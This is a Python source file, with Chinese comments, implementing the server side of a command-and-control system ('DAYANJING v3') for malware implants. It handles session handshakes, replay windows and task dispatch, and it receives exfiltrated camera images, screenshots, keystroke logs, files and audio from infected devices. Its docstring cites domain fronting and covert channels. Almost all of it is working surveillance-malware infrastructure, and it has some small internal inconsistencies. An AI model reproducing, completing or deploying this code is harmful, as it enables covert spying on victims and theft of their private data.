"""
DAYANJING v3 — C2 服务端（13_c2_server）
========================================

服务端职责：
1. 承载 implant 连接，用 PSK + transcript 完成会话派生
2. 以 (implant_id, key_generation) 为键维护重放窗口
3. 通过 SealedEnvelope 下发采集指令（CAPTURE_FRAME）
4. 接收 GCM 密封的回传帧，落盘/分发

设计不变量（来自 v3 设计文档 §3、§7、§13）：
- 先验签后 accept：frame.decode 失败立即关闭连接，不污染重放窗口
- 重放窗口以 (implant_id, key_generation) 为键，跨重连不重置
- 任务领取为原子 CAS，防止重复下发
- 服务端静态身份密钥隔离（不参与会话密钥派生）

本模块为协议层参考实现，传输层（TCP/TLS/域名前置）通过接口隔离，
可替换为原生 TCP、WebSocket 或 covert channel。
"""

import os
import struct
import time
import uuid
import hashlib
from typing import Optional, Dict, Tuple, Callable

from crypto_layer import GCM, hmac_sha256, sha256
from key_derivation import (
    derive_pair, derive_session, HKDF_SALT_REG_LEN,
    INFO_SESSION_C2S, INFO_SESSION_S2C, INFO_SESSION_CONFIRM,
)
from frame import (SealedEnvelope, ReplayWindow, ReplayKey, InvalidFrame,
                   ROLE_CLIENT, ROLE_SERVER)
from session_cache import SessionCache, CacheError
from exfil_sink import (ExfilSink, ExfilError, CELL_WIRE,
                        EXF_TYPE_CAMERA_JPEG, EXF_TYPE_SCREENSHOT,
                        EXF_TYPE_KEYLOG, EXF_TYPE_FILE, EXF_TYPE_AUDIO)

# 产物类型 -> 文件扩展名（仅用于可选的文件落盘；不是类型判定依据）
ARTIFACT_EXT = {
    EXF_TYPE_CAMERA_JPEG: "jpg",
    EXF_TYPE_SCREENSHOT: "png",
    EXF_TYPE_KEYLOG: "txt",
    EXF_TYPE_FILE: "bin",
    EXF_TYPE_AUDIO: "bin",
}

# ---------------------------------------------------------------------------
# 消息类型（帧层 msg_type 域）
# ---------------------------------------------------------------------------

# 服务端 -> 植入端
MSG_CAPTURE_FRAME  = 0x10   # 下发采集指令：payload = {request_id(16B) || flags(4B) || width(4B) || height(4B)}
MSG_HEARTBEAT_ACK  = 0x11   # 心跳响应
MSG_TASK_RESULT    = 0x12   # 通用任务结果回执（预留）

# 植入端 -> 服务端
MSG_HEARTBEAT      = 0x20   # 心跳：payload = 时间戳(8B)，用于拉取待执行任务
MSG_FRAME_DATA     = 0x21   # 采集帧回传：payload = {request_id(16B) || format(4B) || size(4B) || data}
MSG_FRAME_META     = 0x22   # 帧元数据（不含像素数据）：灯光状态、失败原因等
MSG_EXFIL_CELL     = 0x23   # 采集产物回传：payload = 一个 512 字节定长信元（21_exfil）

# 握手
MSG_HELLO          = 0x01
MSG_WELCOME        = 0x02
MSG_FINISHED       = 0x03

MAX_FRAME_PAYLOAD = 16 * 1024 * 1024   # 16 MiB


class C2ProtocolError(Exception):
    """协议层错误，必须映射为静默连接关闭。"""
    pass


# ---------------------------------------------------------------------------
# 会话状态机
# ---------------------------------------------------------------------------

class SessionState:
    """一次 implant 连接的会话状态。

    握手阶段：EXPECT_HELLO -> EXPECT_FINISHED -> ESTABLISHED
    数据阶段：收发 SealedEnvelope，重放窗口在此生效
    """

    EXPECT_HELLO = "expect_hello"
    EXPECT_FINISHED = "expect_finished"
    ESTABLISHED = "established"
    CLOSED = "closed"

    def __init__(self, implant_id: str, generation: int):
        self.implant_id = implant_id
        self.generation = generation
        self.state = self.EXPECT_HELLO
        self.envelope: Optional[SealedEnvelope] = None  # 建立后才有
        self.seq_out = 0          # 本端发送序号
        self.seq_in = -1          # 本端已接受的**最高**上行序号（-1 = 尚未收到）
                                  # 注意不是"下一个期望"：序号允许乱序/跳号，
                                  # 真正的重放判定由 ReplayWindow 负责，
                                  # 本字段只用于持久化与跨重启重建窗口基线。
        self.transcript = b""      # 握手 transcript
        self.handshake_hash = b""
        self.k_c2s: Optional[bytes] = None   # 会话密钥：植入端 -> 服务端
        self.k_s2c: Optional[bytes] = None   # 会话密钥：服务端 -> 植入端
        self.exfil_sink = None     # 采集产物接收端（惰性建立）
        self.resumed = False       # 是否由缓存恢复（而非重新握手）
        self.created_at = time.time()


# ---------------------------------------------------------------------------
# C2 服务端
# ---------------------------------------------------------------------------

class C2Server:
    """C2 服务端核心。

    使用方式：
        server = C2Server(psk, salt_reg, server_static_id)
        server.register_transport(send_fn, close_fn)   # 注入传输层
        server.on_bytes(implant_id, raw)                # 传输层收到字节后喂入
        server.dispatch_capture(implant_id, 640, 480)   # 主动下发采集指令
    """

    def __init__(self, psk: bytes, salt_reg: bytes, server_static_id: bytes,
                 replay_capacity: int = 1024, store=None,
                 artifact_dir: Optional[str] = None,
                 cache: Optional[SessionCache] = None,
                 cache_path: Optional[str] = None):
        """cache 非空时启用会话恢复；cache_path 非空时额外落盘持久化。

        两者都给才算"跨进程可恢复"：只有 cache 则服务重启即失忆，
        只有 cache_path 而没有 cache 对象则无处加载。
        """
        if len(psk) < 16:
            raise ValueError("PSK must be >= 128 bits")
        if len(salt_reg) != HKDF_SALT_REG_LEN:
            raise ValueError(f"salt_reg must be {HKDF_SALT_REG_LEN} bytes")

        self._psk = psk
        self._salt_reg = salt_reg
        self._server_static_id = server_static_id
        self._replay = ReplayWindow(capacity=replay_capacity)

        # 采集产物落库。store 为 None 时不落库，仅走 _artifact_received 钩子。
        self._store = store
        # artifact_dir 非空时额外落文件（默认不落，避免明文散落磁盘）
        self._artifact_dir = artifact_dir
        if artifact_dir:
            os.makedirs(artifact_dir, exist_ok=True)

        # 会话恢复缓存（可选）。master 用 k_identity 派生，与会话密钥域分离。
        self._cache = cache
        self._cache_path = cache_path
        if cache is not None and cache_path:
            try:
                n = cache.load(cache_path)
            except CacheError:
                # 缓存损坏按"无缓存"处理：宁可全部重新握手，
                # 也不能在半可信状态上恢复会话。
                n = 0
            self._cache_loaded = n

        # 会话表：implant_id -> SessionState
        self._sessions: Dict[str, SessionState] = {}
        # 任务表：implant_id -> [task, ...]
        self._pending: Dict[str, list] = {}

        # 注入的传输层回调
        self._send: Optional[Callable[[str, bytes], None]] = None
        self._close: Optional[Callable[[str], None]] = None

        # 已派生对端密钥材料（注册时一次性算出）
        km = derive_pair(psk, salt_reg)
        self._k_server_hold = km.k_server_hold
        self._k_identity = km.k_identity

    # ------------------------------------------------------------------
    # 传输层注入
    # ------------------------------------------------------------------

    def register_transport(self, send_fn: Callable[[str, bytes], None],
                           close_fn: Callable[[str], None]):
        """注入传输层：send_fn(implant_id, bytes)、close_fn(implant_id)。"""
        self._send = send_fn
        self._close = close_fn

    # ------------------------------------------------------------------
    # 握手：服务端侧
    # ------------------------------------------------------------------

    def _begin_handshake(self, implant_id: str, generation: int) -> SessionState:
        sess = SessionState(implant_id, generation)
        self._sessions[implant_id] = sess
        return sess

    def _complete_handshake(self, sess: SessionState, master: bytes):
        """用 master secret 派生会话密钥并实例化 SealedEnvelope。

        派生链（key_derivation.derive_session）：
            session_prk = HKDF-Extract(salt=handshake_hash, ikm=master)
            ctx = PROTO_LABEL || generation(8B) || server_static_id || implant_id
            k_c2s = Expand("session:c2s:v1" + ctx, 16)
            k_s2c = Expand("session:s2c:v1" + ctx, 16)
        """
        ctx = (b"dayanjing-c2/v1"
               + sess.generation.to_bytes(8, "big")
               + self._server_static_id
               + sess.implant_id.encode("utf-8"))
        k_c2s, k_s2c, _k_confirm = derive_session(
            master, sess.handshake_hash, self._server_static_id,
            sess.implant_id, sess.generation)
        # SealedEnvelope(k_send, k_recv, role)
        # 服务端发送用 s2c，接收用 c2s
        sess.envelope = SealedEnvelope(k_s2c, k_c2s, ROLE_SERVER)
        # 保存会话密钥：采集产物接收端（exfil_sink）要基于它派生信元层密钥。
        # 不保存的话就无法复用同一套会话密钥，回传通道与命令通道会分裂成两套。
        sess.k_c2s = k_c2s
        sess.k_s2c = k_s2c
        sess.state = SessionState.ESTABLISHED

        # 落会话恢复缓存：重连时不必重新握手。
        # 记的是当时的收发计数 —— 恢复必须带走计数器，归零即 IV 重用。
        self._cache_put(sess)
        if self._cache is not None and self._cache_path:
            try:
                self._cache.save(self._cache_path)
            except CacheError:
                pass

    # ------------------------------------------------------------------
    # 会话恢复
    # ------------------------------------------------------------------

    @staticmethod
    def _cell_send_counter(sess: SessionState) -> int:
        return 0 if sess.exfil_sink is None else sess.exfil_sink.counter

    @staticmethod
    def _cell_recv_counter(sess: SessionState) -> int:
        # 服务端在回传通道上是接收方，其 counter 即信元流已接受的最大序号
        return 0 if sess.exfil_sink is None else sess.exfil_sink.counter

    def _cache_put(self, sess: "SessionState") -> None:
        """把会话的当前计数状态写回缓存（覆盖同 id 的旧条目）。

        为什么每帧都要写，而不只在握手完成时写：
            握手完成时 seq_in 还是 -1（尚未收到任何上行帧）。若只在那一次
            落缓存，则缓存里的 seq_in 永远是 -1，恢复后重放窗口基线为"未收到"，
            重连的旧序号会被当 new 接受 —— 重放防护在重启后失效。
            （这是本方法存在的唯一理由，不要"优化"成只在握手时写一次。）
        """
        if self._cache is None:
            return
        if sess.k_c2s is None or sess.k_s2c is None:
            return
        try:
            self._cache.put(
                sess.implant_id, sess.generation,
                sess.k_c2s, sess.k_s2c,
                sess.seq_out, sess.seq_in,
                self._cell_send_counter(sess), self._cell_recv_counter(sess))
        except CacheError:
            # 缓存失败不得影响会话本身 —— 最坏退化为"下次重新握手"
            pass

    def resume_session(self, implant_id: str) -> bool:
        """从缓存恢复一个会话。成功返回 True，无缓存/已过期返回 False。

        恢复的关键不是"省一次握手"，而是**计数器从断点续接**：
        信元 IV = pfx || counter，归零会让重连后的 IV 与重连前重合，
        同一密钥下 IV 重用 -> 两条密文异或即泄露明文异或（GCM 致命误用）。
        """
        if self._cache is None:
            return False
        try:
            ent = self._cache.get(implant_id)
        except CacheError:
            return False
        if ent is None:
            return False

        sess = SessionState(implant_id, ent["generation"])
        sess.k_c2s = ent["k_c2s"]
        sess.k_s2c = ent["k_s2c"]
        sess.seq_out = ent["seq_out"]
        sess.seq_in = ent["seq_in"]
        sess.envelope = SealedEnvelope(sess.k_s2c, sess.k_c2s, ROLE_SERVER)
        sess.state = SessionState.ESTABLISHED
        sess.resumed = True
        self._sessions[implant_id] = sess

        # 用持久化的 seq_in 重建重放窗口基线 —— 不重建则服务端重启后
        # 重放防护整体失效（窗口为空，旧序号被当 new 接受）。
        self._replay.seed(ReplayKey(implant_id, ent["generation"]),
                          ent["seq_in"])

        # 回传通道按断点续接建立
        sess.exfil_sink = ExfilSink.for_implant(
            sess.k_c2s, sess.k_s2c, self._server_static_id, implant_id,
            recv_counter=ent["cell_recv_ctr"])
        return True

    def save_cache(self) -> int:
        """显式落盘缓存，返回条目数。未启用缓存返回 0。"""
        if self._cache is None or not self._cache_path:
            return 0
        return self._cache.save(self._cache_path)

    # ------------------------------------------------------------------
    # 字节喂入入口
    # ------------------------------------------------------------------

    def on_bytes(self, implant_id: str, generation: int, raw: bytes):
        """传输层收到字节后调用。返回 None；异常一律静默关闭连接。"""
        try:
            sess = self._sessions.get(implant_id)
            if sess is None:
                sess = self._begin_handshake(implant_id, generation)
            self._handle(sess, raw)
        except (InvalidFrame, C2ProtocolError):
            self._drop(implant_id, "protocol violation")
        except Exception:
            self._drop(implant_id, "internal error")

    def _handle(self, sess: SessionState, raw: bytes):
        if sess.state in (SessionState.EXPECT_HELLO, SessionState.EXPECT_FINISHED):
            self._handle_handshake(sess, raw)
            return

        # 已建立：走帧层
        if sess.envelope is None:
            raise C2ProtocolError("envelope not initialized")

        decoded = sess.envelope.decode(raw)
        if decoded is None:
            # GCM 验签失败 —— 先验签后 accept
            self._drop(sess.implant_id, "auth failed")
            return

        seq, msg_type, payload = decoded

        # 重放窗口判定（以 (implant_id, generation) 为键，跨重连不重置）
        rk = ReplayKey(sess.implant_id, sess.generation)
        verdict = self._replay.accept(rk, seq)
        if verdict != ReplayWindow.ACCEPTED:
            self._drop(sess.implant_id, f"replay verdict: {verdict}")
            return

        # 记录已接受的最高上行序号。必须放在 accept **之后**：
        # 被判为重放的帧不应推进基线，否则伪造帧能把基线推高，
        # 使后续真实帧落入 "too_old" 而被拒。
        if seq > sess.seq_in:
            sess.seq_in = seq
            self._cache_put(sess)   # 回写缓存，使落盘时带的是最新基线

        self._dispatch(sess, seq, msg_type, payload)

    # ------------------------------------------------------------------
    # 握手处理（Hello / Finished）
    # ------------------------------------------------------------------

    def _handle_handshake(self, sess: SessionState, raw: bytes):
        # 握手消息暂用明文 msg_type 前缀 + payload，不走帧层加密
        # （密钥尚未派生，加密层不可用）
        if len(raw) < 4:
            raise C2ProtocolError("handshake frame too short")
        (msg_type,) = struct.unpack("<I", raw[:4])
        payload = raw[4:]

        if sess.state == SessionState.EXPECT_HELLO:
            if msg_type != MSG_HELLO:
                raise C2ProtocolError("expected HELLO")
            # implant_id 已通过 on_bytes 传入；HELLO payload 含 implant 身份证据
            sess.transcript += struct.pack("<I", MSG_HELLO) + payload
            # 生成 WELCOME，携带服务端静态身份与服务端 nonce
            server_nonce = os.urandom(16)
            welcome = server_nonce
            sess.transcript += struct.pack("<I", MSG_WELCOME) + welcome
            sess.state = SessionState.EXPECT_FINISHED
            # 回送 WELCOME（明文，无加密）
            self._raw_send(sess.implant_id, struct.pack("<I", MSG_WELCOME) + welcome)

        elif sess.state == SessionState.EXPECT_FINISHED:
            if msg_type != MSG_FINISHED:
                raise C2ProtocolError("expected FINISHED")
            sess.transcript += struct.pack("<I", MSG_FINISHED) + payload
            # 计算 handshake_hash = SHA256(transcript)
            sess.handshake_hash = sha256(sess.transcript)
            # 会话密钥 = HKDF-Expand(k_server_hold, handshake_hash || ctx)
            # master 使用已注册的 k_server_hold（双方预置）
            self._complete_handshake(sess, self._k_server_hold)

    # ------------------------------------------------------------------
    # 应用消息分发
    # ------------------------------------------------------------------

    def _dispatch(self, sess: SessionState, seq: int, msg_type: int, payload: bytes):
        if msg_type == MSG_HEARTBEAT:
            self._on_heartbeat(sess, payload)
        elif msg_type == MSG_FRAME_DATA:
            self._on_frame(sess, payload)
        elif msg_type == MSG_FRAME_META:
            self._on_frame_meta(sess, payload)
        elif msg_type == MSG_EXFIL_CELL:
            self._on_exfil_cell(sess, payload)
        else:
            self._drop(sess.implant_id, f"unknown msg_type: {msg_type}")

    def _on_heartbeat(self, sess: SessionState, payload: bytes):
        # 心跳：回送确认 + 下发所有待执行任务
        ack = struct.pack("<I", MSG_HEARTBEAT_ACK) + payload
        self._send_frame(sess, MSG_HEARTBEAT_ACK, payload)
        self._drain_pending(sess)

    def _on_frame(self, sess: SessionState, payload: bytes):
        if len(payload) < 40:
            raise C2ProtocolError("frame payload too short")
        request_id = payload[:16]
        fmt = struct.unpack("<I", payload[16:20])[0]
        size = struct.unpack("<I", payload[20:24])[0]
        data = payload[24:]
        if size != len(data):
            raise C2ProtocolError("frame size mismatch")
        # TODO(13_c2_server): 落盘 / 分发到分析管线
        # 此处只做协议层接收，不落明文文件
        self._frame_received(sess.implant_id, request_id, fmt, data)

    def _on_frame_meta(self, sess: SessionState, payload: bytes):
        # 元数据：灯光状态、失败原因等，供决策
        pass

    def _frame_received(self, implant_id: str, request_id: bytes, fmt: int, data: bytes):
        """帧接收钩子，子类可覆写实现落盘/分发。"""
        # 默认：不落盘，仅记录引用
        pass

    # ------------------------------------------------------------------
    # 采集产物回传（21_exfil 定长信元流 -> 落库）
    # ------------------------------------------------------------------

    def _exfil_sink(self, sess: SessionState):
        """惰性建立并缓存接收端。密钥取自本会话派生结果，与命令通道同一套。"""
        if sess.exfil_sink is not None:
            return sess.exfil_sink
        if sess.k_c2s is None or sess.k_s2c is None:
            raise C2ProtocolError("session keys unavailable")
        sink = ExfilSink.for_implant(sess.k_c2s, sess.k_s2c,
                                     self._server_static_id, sess.implant_id)
        sess.exfil_sink = sink
        return sink

    def _on_exfil_cell(self, sess: SessionState, payload: bytes):
        """喂入一个信元。一批收满（收到 FIN）时落库。"""
        if len(payload) != CELL_WIRE:
            raise C2ProtocolError(f"exfil cell must be {CELL_WIRE} bytes")

        sink = self._exfil_sink(sess)
        try:
            rec = sink.feed(payload)
        except ExfilError:
            # AEAD / CRC / 格式失败一律静默关闭，不回显原因（不泄露判定依据）
            self._drop(sess.implant_id, "exfil verification failed")
            return

        if rec is None:
            return                      # 累积中，或喂入的是覆盖信元

        artifact_id = None
        if self._store is not None:
            artifact_id = self._store.put_artifact(
                sess.implant_id, sess.generation, rec["type"], rec["seq"],
                rec["ts_us"], rec["width"], rec["height"], rec["flags"],
                rec["name"], rec["payload"])
        if self._artifact_dir:
            self._write_artifact_file(sess, rec)
        self.on_artifact(sess.implant_id, rec, artifact_id)

    def _write_artifact_file(self, sess: SessionState, rec: dict):
        """可选：额外落文件。

        路径只用受控字段构造 —— 远端设备名（rec["name"]）绝不参与拼路径，
        否则一个含 "../" 的设备名就能把产物写到任意位置。
        """
        safe = hashlib.sha256(sess.implant_id.encode("utf-8")).hexdigest()[:16]
        d = os.path.join(self._artifact_dir, safe)
        os.makedirs(d, exist_ok=True)
        ext = ARTIFACT_EXT.get(rec["type"], "bin")
        fn = f"{rec['seq']:016x}_{rec['ts_us']:016x}.{ext}"
        with open(os.path.join(d, fn), "wb") as f:
            f.write(rec["payload"])

    def on_artifact(self, implant_id: str, rec: dict, artifact_id):
        """产物落库钩子，子类覆写做分发 / 告警 / 分析。"""
        pass

    def exfil_incomplete(self, implant_id: str) -> bool:
        """该 implant 是否有未收满的批。连接断开时应据此判定产物残缺。"""
        sess = self._sessions.get(implant_id)
        if sess is None or sess.exfil_sink is None:
            return False
        return sess.exfil_sink.incomplete

    # ------------------------------------------------------------------
    # 任务下发
    # ------------------------------------------------------------------

    def dispatch_capture(self, implant_id: str, width: int, height: int,
                         flags: int = 0) -> bytes:
        """向指定 implant 下发采集指令，返回 request_id。"""
        if implant_id not in self._sessions:
            raise C2ProtocolError("no session for implant")
        sess = self._sessions[implant_id]
        if sess.state != SessionState.ESTABLISHED:
            raise C2ProtocolError("session not established")

        request_id = os.urandom(16)
        payload = (request_id
                   + struct.pack("<I", flags)
                   + struct.pack("<I", width)
                   + struct.pack("<I", height))
        self._send_frame(sess, MSG_CAPTURE_FRAME, payload)
        return request_id

    def _drain_pending(self, sess: SessionState):
        """原子 CAS 拉取待执行任务。"""
        queue = self._pending.get(sess.implant_id)
        if not queue:
            return
        # 每次心跳只下发一条，避免拥塞
        task = queue.pop(0)
        self._send_frame(sess, task["type"], task["payload"])

    def enqueue(self, implant_id: str, msg_type: int, payload: bytes):
        """入队任务，待下次心跳时原子领取。"""
        self._pending.setdefault(implant_id, []).append(
            {"type": msg_type, "payload": payload})

    # ------------------------------------------------------------------
    # 帧层发送
    # ------------------------------------------------------------------

    def _send_frame(self, sess: SessionState, msg_type: int, payload: bytes):
        if len(payload) > MAX_FRAME_PAYLOAD:
            raise C2ProtocolError("payload exceeds limit")
        if sess.envelope is None:
            raise C2ProtocolError("envelope not ready")
        seq = sess.seq_out
        sess.seq_out += 1
        frame = sess.envelope.encode(seq, msg_type, payload)
        self._raw_send(sess.implant_id, frame)

    def _raw_send(self, implant_id: str, raw: bytes):
        if self._send is None:
            raise C2ProtocolError("transport not registered")
        self._send(implant_id, raw)

    def _drop(self, implant_id: str, reason: str):
        sess = self._sessions.pop(implant_id, None)
        if sess is not None:
            sess.state = SessionState.CLOSED
        if self._close is not None:
            self._close(implant_id)
        # 不回显 reason —— 静默关闭
